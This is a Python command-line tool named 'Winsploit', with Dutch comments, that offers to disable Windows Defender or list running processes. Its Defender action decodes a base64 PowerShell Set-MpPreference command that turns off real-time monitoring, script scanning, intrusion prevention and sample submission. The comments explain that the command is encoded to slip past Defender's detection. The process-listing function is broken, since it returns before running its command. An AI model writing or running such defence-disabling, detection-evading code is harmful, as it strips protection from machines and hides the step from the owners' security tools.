import sys
import subprocess
import base64
import click
import pyfiglet
import random
from banners import banner_list


# Toon de prachtige banner
def show_banner():
    selected_banner_ascii = random.choice(banner_list)
    version = 1.0
    complete_banner = f"{selected_banner_ascii}"
    click.echo(complete_banner)
    pyfiglet.print_figlet(f"Winsploit\nVer: {version}", font='rectangles')
    click.echo("\nLaurens Metz,\nThijs Vixseboxse,\nMario Mancev")


# Functie voor het controlleren of het script op Windows wordt uitgevoerd.
def check_os():
    if sys.platform == "win32":
        return True
    else:
        return False


# Functie voor het uitzetten van Windows Defender
def disable_win_defender():
    # base64 encoding van het commando omdat Windows Defender het programma anders als een virus flagt
    disable_cmd_b64 = "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAgJHRydWUgLURpc2FibGVTY3JpcHRTY2FubmluZyAgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZA=="
    # We mogen het niet in een variabel opslaan, vind Windows defender niet leuk. Vandaar deze prachtige code. (strip voor de newline char, decode om het bytes object naar string te veranderen, f voor fstring.)
    try:
        subprocess.call(f"runonce.exe \'powershell.exe -Command {base64.b64decode(
            disable_cmd_b64).strip().decode()}\'", shell=True)
        return "Defender is uitgeschakeld."
    except Exception as e:
        return f"Er ging iets mis: {e}"


def show_running_processes():
    show_ps_command = "gps"
    try:
        return "de draaiende processen:"
        subprocess.call(f"powershell.exe {show_ps_command}", shell=True)
    except Exception as e:
        return f"er ging iets mis: {e}"


@click.command()
@click.option("--action", help="De actie die uitgevoerd moet worden.", type=click.Choice(["disable_defender", "ps"]))
# disable_defender voor het uitzetten van defender. ps voor het tonen van draaiende processen.
# Main functie
def main(action):
    if not action:
        show_banner()
        action = click.prompt('Welke actie wil je uitvoeren?',
                              type=click.Choice(["disable_defender", "ps"]))
    match action:
        case "disable_defender":
            # Is dit een windows omgeving?
            if check_os():
                click.echo(disable_win_defender())
            else:
                click.echo(f"Dit programma werkt alleen in een Windows omgeving. Jouw OS: {
                           sys.platform}")
        case "ps":
            click.echo(show_running_processes())


if __name__ == '__main__':
    main()

# TODO: wachtwoord vragen en Powershell als administrator runnen
